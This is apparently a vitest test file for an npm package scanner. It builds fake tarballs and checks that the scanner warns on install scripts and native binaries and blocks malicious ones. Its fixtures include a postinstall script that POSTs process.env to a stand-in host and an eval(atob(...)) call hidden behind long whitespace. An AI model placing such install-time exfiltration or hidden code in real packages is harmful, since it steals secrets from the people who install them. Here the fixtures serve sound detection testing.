// croak-invariants: pattern-data
// Package contents below are detector inputs, not code (D16).
import { describe, expect, it } from "vitest";
import { contentFindings } from "./content.ts";
import { snapshotTarball } from "./tar.ts";
import { tar } from "./test-tar.ts";

const pkg = (files: Record<string, string>) =>
  snapshotTarball(
    tar(
      Object.entries(files).map(([name, content]) => ({
        name: `package/${name}`,
        content,
      })),
    ),
  );
const scan = (files: Record<string, string>) =>
  contentFindings("x@1.0.0", pkg(files));
const manifest = (scripts: Record<string, string>) =>
  JSON.stringify({ name: "x", version: "1.0.0", scripts });

describe("contentFindings", () => {
  it("is quiet for a plain library", () => {
    expect(
      scan({
        "package.json": manifest({ test: "node test.js" }),
        "index.js": "module.exports = (a) => a + 1;",
      }),
    ).toEqual([]);
  });

  it("treats a binary installer (network + spawn at install time) as a warning, not a block", () => {
    const findings = scan({
      "package.json": manifest({ postinstall: "node install.js" }),
      "install.js":
        'const https = require("https");\nconst cp = require("child_process");\nhttps.get(url, save);',
    });
    expect(findings.map((f) => `${f.severity}:${f.ruleId}`)).toEqual([
      "warn:repo/lifecycle-script",
    ]);
    expect(findings[0]?.file).toBe("x@1.0.0/package.json");
  });

  it("blocks an install script that sends the environment", () => {
    const findings = scan({
      "package.json": manifest({ postinstall: "node setup.js" }),
      "setup.js":
        'fetch("https://x.invalid", { method: "POST", body: JSON.stringify(process.env) });',
    });
    expect(findings[0]?.severity).toBe("block");
  });

  it("blocks hidden and obfuscated code inside the package", () => {
    expect(
      scan({
        "package.json": manifest({}),
        "lib.js": `exports.a = 1;${" ".repeat(300)}eval(atob("eA=="));`,
      })[0]?.severity,
    ).toBe("block");
  });

  it("warns about prebuilt native binaries it cannot inspect", () => {
    const findings = scan({
      "package.json": manifest({}),
      "build/Release/addon.node": "\u007fELF",
    });
    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "install/native-binary",
        severity: "warn",
      }),
    ]);
  });
});
